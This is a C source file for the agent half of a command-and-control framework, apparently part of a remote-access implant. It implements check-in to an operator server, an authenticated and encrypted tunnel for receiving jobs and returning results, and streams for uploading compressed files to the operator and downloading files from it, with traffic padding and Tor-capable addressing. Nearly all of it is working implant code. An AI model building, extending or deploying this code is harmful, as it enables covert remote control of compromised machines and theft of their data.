/*
 * session.c — the agent half of the C2 flow.
 *
 * Implements the sequence documented in README.md under Design/Lifecycle:
 * check-in, msg-tunnel hello + ECDH handshake, job read/reply, and the
 * one-shot www/ftp file streams. It is transport-agnostic: everything goes
 * through c2_transport (c2_http_poll.c, a duplex stream, or the in-memory
 * transport used by tests), and every crypto operation goes through the
 * c2_crypto_backend vtable.
 *
 * The tunnel is driven synchronously: the caller loops
 * c2_session_hello -> c2_session_read and handles jobs. That matches a
 * single-threaded C agent and keeps the state machine explicit.
 */

/* _POSIX_C_SOURCE exposes clock_gettime/gmtime_r under -std=c99. */
#define _POSIX_C_SOURCE 200809L

#include "transport.h"

#include "crypto.h"
#include "gzip.h"
#include "secureconn.h"

#include "cbor.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* One envelope is small; the server caps MsgAuth at 8 KiB and jobs are far
 * smaller. Anything larger is a protocol violation, not a reason to grow. */
#define C2_SESSION_MSG_MAX (64u * 1024u)
#define C2_SESSION_AUTH_MAX C2_AUTH_FRAME_MAX

/* ------------------------------------------------------------------------- */
/* Small helpers                                                              */
/* ------------------------------------------------------------------------- */

static int64_t now_unix(void) {
  return (int64_t)time(NULL);
}

/* Go's MsgTunData.Time layout: "2006-01-02 15:04:05.999999999 -0700 MST".
 * The server only uses it for RTT, so UTC with nanoseconds is enough. */
static size_t format_time(char *out, size_t cap) {
  struct timespec ts;
  if (clock_gettime(CLOCK_REALTIME, &ts) != 0)
    return 0;
  struct tm tm;
  if (gmtime_r(&ts.tv_sec, &tm) == NULL)
    return 0;
  char base[32];
  if (strftime(base, sizeof(base), "%Y-%m-%d %H:%M:%S", &tm) == 0)
    return 0;
  int n = snprintf(out, cap, "%s.%09ld +0000 UTC", base, ts.tv_nsec);
  return (n > 0 && (size_t)n < cap) ? (size_t)n : 0;
}

static void rand_hex(const c2_crypto_backend *be, char *out, size_t nbytes) {
  uint8_t raw[128];
  if (nbytes > sizeof(raw))
    nbytes = sizeof(raw);
  if (be->random(be->ctx, raw, nbytes) != 0)
    memset(raw, 0, nbytes);
  c2_hex_encode(raw, nbytes, out);
  out[nbytes * 2] = '\0';
}

/* A random RFC 4122 v4 string; the C2 treats JobID as opaque. */
static void rand_uuid(const c2_crypto_backend *be, char *out, size_t cap) {
  uint8_t b[16];
  if (be->random(be->ctx, b, sizeof(b)) != 0)
    memset(b, 0, sizeof(b));
  b[6] = (uint8_t)((b[6] & 0x0f) | 0x40);
  b[8] = (uint8_t)((b[8] & 0x3f) | 0x80);
  if (cap < 37) {
    out[0] = '\0';
    return;
  }
  snprintf(
      out, cap,
      "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
      b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7], b[8], b[9], b[10], b[11],
      b[12], b[13], b[14], b[15]);
}

/* base64url(ECDSA_DER(priv, msg)). */
static c2_status sign_b64(const c2_crypto_backend *be,
                          const uint8_t priv[C2_P256_PRIV_BYTES], c2_str msg,
                          char *out, size_t cap, size_t *out_len) {
  uint8_t sig[72];
  size_t sig_len = 0;
  if (msg.len > 0 && msg.ptr == NULL)
    return C2_ERR_ARG;
  if (be->ecdsa_p256_sign_der(be->ctx, priv, (const uint8_t *)msg.ptr, msg.len,
                              sig, sizeof(sig), &sig_len) != 0)
    return C2_ERR_CRYPTO;
  size_t n = c2_base64url_encode(sig, sig_len, out, cap);
  if (n == 0)
    return C2_ERR_NOMEM;
  if (out_len)
    *out_len = n;
  return C2_OK;
}

/* URL from the build config, mirroring the Go agent's framing:
 *   http_poll  -> http://<host>:<CCHTTPPort><C2Path>
 *   otherwise  -> https://<host>:<CCH2Port><C2Path>
 * A cc_address that already carries a scheme (Tor/full URL) is used as-is. */
static c2_status build_url(const c2_agent_config *cfg, char *out, size_t cap) {
  c2_str base = cfg->cc_address;
  c2_str path = cfg->http.c2_path;
  if (base.len > 0 && base.ptr == NULL)
    return C2_ERR_ARG;
  int has_scheme = 0;
  for (size_t i = 0; i + 2 < base.len; i++) {
    if (base.ptr[i] == ':' && base.ptr[i + 1] == '/' &&
        base.ptr[i + 2] == '/') {
      has_scheme = 1;
      break;
    }
  }
  int is_http = c2_str_equal(cfg->c2_channel_mode, C2_CHANNEL_DEFAULT);

  size_t o = 0;
  if (!has_scheme) {
    const char *scheme = is_http ? "http://" : "https://";
    size_t sl = strlen(scheme);
    if (o + sl + base.len > cap)
      return C2_ERR_NOMEM;
    memcpy(out + o, scheme, sl);
    o += sl;
    memcpy(out + o, base.ptr, base.len);
    o += base.len;
    c2_str port = is_http ? cfg->cc_http_port : cfg->cc_h2_port;
    if (port.len) {
      if (o + 1 + port.len > cap)
        return C2_ERR_NOMEM;
      out[o++] = ':';
      memcpy(out + o, port.ptr, port.len);
      o += port.len;
    }
  } else {
    if (o + base.len > cap)
      return C2_ERR_NOMEM;
    memcpy(out + o, base.ptr, base.len);
    o += base.len;
  }
  if (path.len) {
    if (o + path.len > cap)
      return C2_ERR_NOMEM;
    memcpy(out + o, path.ptr, path.len);
    o += path.len;
  }
  if (o >= cap)
    return C2_ERR_NOMEM;
  out[o] = '\0';
  return C2_OK;
}

static int is_bootstrap_route(const c2_agent_config *cfg, c2_str route) {
  return c2_str_equal_str(route, cfg->routes.checkin) ||
         c2_str_equal_str(route, cfg->routes.msg);
}

/* ------------------------------------------------------------------------- */
/* Session setup / route open                                                  */
/* ------------------------------------------------------------------------- */

c2_status c2_session_init(c2_agent_session *s, const c2_crypto_backend *be,
                          c2_transport transport, const c2_agent_config *cfg,
                          const uint8_t *agent_priv) {
  if (s == NULL || be == NULL || cfg == NULL)
    return C2_ERR_ARG;
  memset(s, 0, sizeof(*s));
  s->be = be;
  s->transport = transport;
  s->config = cfg;

  c2_status st = c2_psk_from_magic(be, cfg->magic_string.ptr,
                                   cfg->magic_string.len, s->psk);
  if (st != C2_OK)
    return st;

  if (agent_priv != NULL) {
    memcpy(s->agent_priv, agent_priv, C2_P256_PRIV_BYTES);
    /* The public key is not derivable through the vtable, so a caller that
     * imports a private key must also hand over the matching public key via
     * c2_session_set_identity_pub. */
  } else {
    if (be->ec_p256_keygen == NULL)
      return C2_ERR_UNSUPPORTED;
    if (be->ec_p256_keygen(be->ctx, s->agent_priv, s->agent_pub) != 0)
      return C2_ERR_CRYPTO;
  }

  /* Allocate the read buffer last, so a failure above leaves the session
   * zeroed and c2_session_cleanup is always a safe no-op. */
  s->rxcap = C2_SESSION_MSG_MAX;
  s->rxbuf = (uint8_t *)malloc(s->rxcap);
  if (s->rxbuf == NULL) {
    s->rxcap = 0;
    return C2_ERR_NOMEM;
  }
  return C2_OK;
}

void c2_session_cleanup(c2_agent_session *s) {
  if (s == NULL)
    return;
  c2_secure_zero(s->agent_priv, sizeof(s->agent_priv));
  c2_secure_zero(s->pfs_priv, sizeof(s->pfs_priv));
  c2_secure_zero(s->session_key, sizeof(s->session_key));
  c2_secure_zero(s->psk, sizeof(s->psk));
  free(s->rxbuf);
  s->rxbuf = NULL;
  s->rxcap = 0;
}

void c2_session_set_identity_pub(c2_agent_session *s,
                                 const uint8_t pub[C2_P256_PUB_BYTES]) {
  if (s != NULL && pub != NULL)
    memcpy(s->agent_pub, pub, C2_P256_PUB_BYTES);
}

c2_status c2_session_open_route(c2_agent_session *s, c2_str route,
                                c2_str stream_id, const c2_str_list *caps,
                                c2_secureconn *sc) {
  if (s == NULL || sc == NULL || s->transport.ops == NULL ||
      s->transport.ops->open == NULL)
    return C2_ERR_ARG;

  char url[1024];
  c2_status st = build_url(s->config, url, sizeof(url));
  if (st != C2_OK)
    return st;

  c2_stream stream;
  memset(&stream, 0, sizeof(stream));
  if (s->transport.ops->open(s->transport.ctx, url, &s->config->http,
                             &stream) != C2_OK)
    return C2_ERR_IO;
  if (stream.ops == NULL)
    return C2_ERR_IO;

  c2_secureconn_init(sc, s->be, stream, s->psk);
  if (s->config->padding_min > 0 || s->config->padding_max > 0)
    c2_secureconn_set_padding(sc, (uint32_t)s->config->padding_min,
                              (uint32_t)s->config->padding_max);

  /* Build MsgAuth: identity + route + signed canonical string. */
  char nonce[33];
  rand_hex(s->be, nonce, 16);
  int64_t ts = now_unix();
  char canonical[512];
  size_t canon_len = 0;
  st = c2_auth_canonical(s->config->agent_uuid, ts, c2_str_of(nonce, 32), caps,
                         canonical, sizeof(canonical), &canon_len);
  if (st != C2_OK) {
    c2_secureconn_close(sc);
    return st;
  }
  char proof[128];
  size_t proof_len = 0;
  st = sign_b64(s->be, s->agent_priv, c2_str_of(canonical, canon_len), proof,
                sizeof(proof), &proof_len);
  if (st != C2_OK) {
    c2_secureconn_close(sc);
    return st;
  }

  c2_msgauth m;
  memset(&m, 0, sizeof(m));
  m.type = c2_str_lit(C2_MSGAUTH_TYPE);
  m.agent_uuid = s->config->agent_uuid;
  m.identity_token = s->config->agent_uuid_sig;
  m.timestamp = ts;
  m.nonce = c2_str_of(nonce, 32);
  m.capabilities = *caps;
  m.agent_proof = c2_str_of(proof, proof_len);
  m.stream_id = stream_id;
  m.protocol_version = C2_PROTOCOL_VERSION;

  uint8_t buf[C2_SESSION_AUTH_MAX];
  CborEncoder enc;
  cbor_encoder_init(&enc, buf, sizeof(buf), 0);
  st = c2_msgauth_encode(&enc, &m);
  if (st != C2_OK) {
    c2_secureconn_close(sc);
    return st;
  }
  size_t len = cbor_encoder_get_buffer_size(&enc, buf);
  st = c2_secureconn_write(sc, buf, len);
  if (st != C2_OK) {
    c2_secureconn_close(sc);
    return st;
  }

  /* Auxiliary streams re-key to the current PFS key right after MsgAuth. */
  if (!is_bootstrap_route(s->config, route) && s->pfs_established)
    c2_secureconn_set_key(sc, s->session_key);
  return C2_OK;
}

/* ------------------------------------------------------------------------- */
/* Check-in                                                                    */
/* ------------------------------------------------------------------------- */

c2_status c2_session_checkin(c2_agent_session *s, const c2_agent_info *info) {
  if (s == NULL || info == NULL)
    return C2_ERR_ARG;

  c2_str caps_items[1] = {s->config->routes.checkin};
  c2_str_list caps = {caps_items, 1, 1};

  c2_secureconn sc;
  c2_status st = c2_session_open_route(s, s->config->routes.checkin,
                                       c2_str_lit(""), &caps, &sc);
  if (st != C2_OK)
    return st;

  /* A minimal agent may omit the PEM; fill it from the session identity. */
  c2_agent_info body = *info;
  char pem[256];
  if (body.public_key.ptr == NULL) {
    size_t pl = c2_p256_pub_to_pem(s->agent_pub, pem, sizeof(pem));
    if (pl == 0) {
      c2_secureconn_close(&sc);
      return C2_ERR_NOMEM;
    }
    body.public_key = c2_str_of(pem, pl);
  }

  uint8_t buf[C2_SESSION_MSG_MAX];
  CborEncoder enc;
  cbor_encoder_init(&enc, buf, sizeof(buf), 0);
  st = c2_agent_info_encode(&enc, &body);
  if (st != C2_OK) {
    c2_secureconn_close(&sc);
    return st;
  }
  size_t len = cbor_encoder_get_buffer_size(&enc, buf);
  st = c2_secureconn_write(&sc, buf, len);
  if (st == C2_OK) {
    size_t mlen = 0;
    int eof = 0;
    st = c2_secureconn_read_msg(&sc, buf, sizeof(buf), &mlen, &eof);
    if (st == C2_OK && eof)
      st = C2_ERR_PROTO;
    if (st == C2_OK) {
      CborParser p;
      CborValue it;
      c2_msgtun ack;
      memset(&ack, 0, sizeof(ack));
      if (cbor_parser_init(buf, mlen, 0, &p, &it) != CborNoError)
        st = C2_ERR_PROTO;
      else if ((st = c2_msgtun_decode(&it, &ack)) == C2_OK &&
               !c2_str_equal(ack.tag, C2_TAG_CHECKIN_OK))
        st = C2_ERR_AUTH;
    }
  }
  c2_secureconn_close(&sc);
  return st;
}

/* ------------------------------------------------------------------------- */
/* Message tunnel                                                              */
/* ------------------------------------------------------------------------- */

c2_status c2_session_hello(c2_agent_session *s, c2_secureconn *msg,
                           int send_ephem) {
  if (s == NULL || msg == NULL)
    return C2_ERR_ARG;

  char rand_str[17];
  rand_hex(s->be, rand_str, 8);
  c2_str cmd_items[1] = {c2_str_of(rand_str, 16)};
  c2_str_list cmd = {cmd_items, 1, 1};

  if (send_ephem) {
    if (s->be->ec_p256_keygen == NULL)
      return C2_ERR_UNSUPPORTED;
    if (s->be->ec_p256_keygen(s->be->ctx, s->pfs_priv, s->pfs_pub) != 0)
      return C2_ERR_CRYPTO;
    s->pfs_pending = 1;
  }

  char job_id[40] = {0};
  rand_uuid(s->be, job_id, sizeof(job_id));
  memcpy(s->hello_job_id, job_id, sizeof(s->hello_job_id));

  char tbuf[48];
  size_t tlen = format_time(tbuf, sizeof(tbuf));
  char uuidsig[128];
  size_t uuidsig_len = 0;
  c2_status st = sign_b64(s->be, s->agent_priv, s->config->agent_uuid, uuidsig,
                          sizeof(uuidsig), &uuidsig_len);
  if (st != C2_OK)
    return st;

  c2_msgtun m;
  memset(&m, 0, sizeof(m));
  m.job_id = c2_str_of(job_id, strlen(job_id));
  m.cmd_slice = cmd;
  m.tag = s->config->agent_tag;
  m.time = c2_str_of(tbuf, tlen);
  m.agent_uuid = s->config->agent_uuid;
  m.agent_uuid_sig = c2_str_of(uuidsig, uuidsig_len);
  if (send_ephem)
    m.ephem_public_key = c2_bytes_of(s->pfs_pub, C2_P256_PUB_BYTES);

  uint8_t buf[C2_SESSION_MSG_MAX];
  CborEncoder enc;
  cbor_encoder_init(&enc, buf, sizeof(buf), 0);
  st = c2_msgtun_encode(&enc, &m);
  if (st != C2_OK)
    return st;
  return c2_secureconn_write(msg, buf, cbor_encoder_get_buffer_size(&enc, buf));
}

c2_status c2_session_read(c2_agent_session *s, c2_secureconn *msg,
                          c2_msgtun *out, int *is_job) {
  if (s == NULL || msg == NULL || out == NULL || is_job == NULL)
    return C2_ERR_ARG;
  *is_job = 0;
  if (s->rxbuf == NULL)
    return C2_ERR_ARG;

  uint8_t *buf = s->rxbuf;
  size_t len = 0;
  int eof = 0;
  c2_status st = c2_secureconn_read_msg(msg, buf, s->rxcap, &len, &eof);
  if (st != C2_OK)
    return st;
  if (eof)
    return C2_ERR_IO; /* tunnel closed; the caller reconnects */

  /* Give the decoder session-owned list storage so a job response does not
   * fail just because the caller zeroed its c2_msgtun. */
  if (out->cmd_slice.items == NULL) {
    out->cmd_slice.items = s->rx_cmd_items;
    out->cmd_slice.cap = C2_SESSION_LIST_MAX;
  }

  CborParser p;
  CborValue it;
  if (cbor_parser_init(buf, len, 0, &p, &it) != CborNoError)
    return C2_ERR_PROTO;
  st = c2_msgtun_decode(&it, out);
  if (st != C2_OK)
    return st;

  /* First handshake reply: derive the PFS key and switch the tunnel. */
  if (c2_str_equal(out->tag, C2_TAG_HANDSHAKE) && s->pfs_pending) {
    if (out->response.len != C2_P256_PUB_BYTES || s->be->ecdh_p256 == NULL)
      return C2_ERR_PROTO;
    uint8_t shared[C2_P256_COORD_BYTES];
    if (s->be->ecdh_p256(s->be->ctx, s->pfs_priv, out->response.ptr, shared) !=
        0)
      return C2_ERR_CRYPTO;
    st = c2_derive_session_key(s->be, shared, s->config->agent_uuid,
                               s->session_key);
    c2_secure_zero(shared, sizeof(shared));
    if (st != C2_OK)
      return st;
    c2_secureconn_set_key(msg, s->session_key);
    s->pfs_established = 1;
    s->pfs_pending = 0;
    return C2_OK;
  }

  *is_job = out->cmd_slice.count > 0;
  return C2_OK;
}

c2_status c2_session_send_result(c2_agent_session *s, c2_secureconn *msg,
                                 c2_str job_id, const c2_str_list *cmd_slice,
                                 const uint8_t *response, size_t response_len) {
  if (s == NULL || msg == NULL || cmd_slice == NULL)
    return C2_ERR_ARG;

  /* The C2 routes the reply by Tag/UUID; include the same identity the hello
   * carries (a fresh signature over the UUID proves it is us). */
  char tbuf[48];
  size_t tlen = format_time(tbuf, sizeof(tbuf));
  char uuidsig[128];
  size_t uuidsig_len = 0;
  c2_status st = sign_b64(s->be, s->agent_priv, s->config->agent_uuid, uuidsig,
                          sizeof(uuidsig), &uuidsig_len);
  if (st != C2_OK)
    return st;

  c2_msgtun m;
  memset(&m, 0, sizeof(m));
  m.job_id = job_id;
  m.cmd_slice = *cmd_slice;
  m.response = c2_bytes_of(response, response_len);
  m.tag = s->config->agent_tag;
  m.time = c2_str_of(tbuf, tlen);
  m.agent_uuid = s->config->agent_uuid;
  m.agent_uuid_sig = c2_str_of(uuidsig, uuidsig_len);

  uint8_t buf[C2_SESSION_MSG_MAX];
  CborEncoder enc;
  cbor_encoder_init(&enc, buf, sizeof(buf), 0);
  st = c2_msgtun_encode(&enc, &m);
  if (st != C2_OK)
    return st;
  return c2_secureconn_write_bulk(msg, buf,
                                  cbor_encoder_get_buffer_size(&enc, buf));
}

/* ------------------------------------------------------------------------- */
/* File streams                                                                */
/* ------------------------------------------------------------------------- */

c2_status c2_session_upload(c2_agent_session *s, c2_str token,
                            const uint8_t *data, size_t len) {
  if (s == NULL || (len > 0 && data == NULL))
    return C2_ERR_ARG;

  c2_str caps_items[1] = {s->config->routes.ftp};
  c2_str_list caps = {caps_items, 1, 1};
  c2_secureconn sc;
  c2_status st =
      c2_session_open_route(s, s->config->routes.ftp, token, &caps, &sc);
  if (st != C2_OK)
    return st;

  size_t gz_cap = c2_gzip_bound(len);
  uint8_t *gz = (uint8_t *)malloc(gz_cap);
  if (gz == NULL) {
    c2_secureconn_close(&sc);
    return C2_ERR_NOMEM;
  }
  size_t gz_len = 0;
  st = c2_gzip_compress(data, len, gz, gz_cap, &gz_len);
  /* Write the gzip stream in frames; the C2 relays the bytes verbatim. */
  const size_t chunk = 1024u * 1024u;
  for (size_t off = 0; st == C2_OK && off < gz_len; off += chunk) {
    size_t n = gz_len - off < chunk ? gz_len - off : chunk;
    st = c2_secureconn_write_bulk(&sc, gz + off, n);
  }
  free(gz);
  c2_secureconn_close(&sc);
  return st;
}

c2_status c2_session_download(c2_agent_session *s, c2_str name, uint8_t *out,
                              size_t out_cap, size_t *out_len) {
  if (s == NULL || out == NULL || out_len == NULL)
    return C2_ERR_ARG;

  c2_str caps_items[1] = {s->config->routes.www};
  c2_str_list caps = {caps_items, 1, 1};
  c2_secureconn sc;
  c2_status st =
      c2_session_open_route(s, s->config->routes.www, name, &caps, &sc);
  if (st != C2_OK)
    return st;

  size_t total = 0;
  for (;;) {
    if (total >= out_cap) {
      st = C2_ERR_NOMEM;
      break;
    }
    long n = c2_secureconn_read(&sc, out + total, out_cap - total);
    if (n < 0) {
      st = (c2_status)n;
      break;
    }
    if (n == 0)
      break; /* clean EOF: the operator closed the stream */
    total += (size_t)n;
  }
  c2_secureconn_close(&sc);
  if (st == C2_OK)
    *out_len = total;
  return st;
}
